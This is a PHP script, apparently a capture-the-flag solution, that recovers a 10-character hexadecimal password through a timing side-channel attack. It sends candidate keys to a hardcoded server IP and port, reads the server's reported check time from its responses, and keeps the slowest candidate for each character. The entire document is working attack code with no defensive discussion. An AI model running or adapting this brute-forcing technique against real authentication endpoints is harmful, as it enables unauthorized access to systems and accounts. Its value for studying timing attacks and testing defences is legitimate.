<?
//Reads $input from standard input
$input = fgets(STDIN);

//This will become the whole password
$pass = '';

for ($k = 0; $k < 10; ++$k) {
  $best = 0;
  $ibest = 0;
  for ($i = 0; $i < 16; ++$i) {
    //Converts $i to its hexadecimal character
    $j = $i;
    if ($j >= 10) $j = chr(97 + $j - 10);
    
    $url = 'http://54.83.207.90:4242/?debug=0';
    $data = array('key' => $pass . $j, 'input' => '' . $input);

    //Send a request to the server
    $options = array(
      'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
      ),
    );
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    //Divide by lines
    $result = explode("\n", $result);
    
    //This happens when the whole password is correct
    if ($result[139] == '</html>') {
      $best = 1000000;
      $ibest = $j;
    }
    else {
      //Divide this line by spaces
      $result = explode(" ", $result[27]);
      
      //Check the time spent by the server checking current password
      if ($result[2] > $best) {
        $best = $result[2];
        $ibest = $j;
      }
    }
  }
  //The correct character is the one that costed more time
  $pass = $pass . $ibest;
}
//Print password
echo $pass . "\n";
?>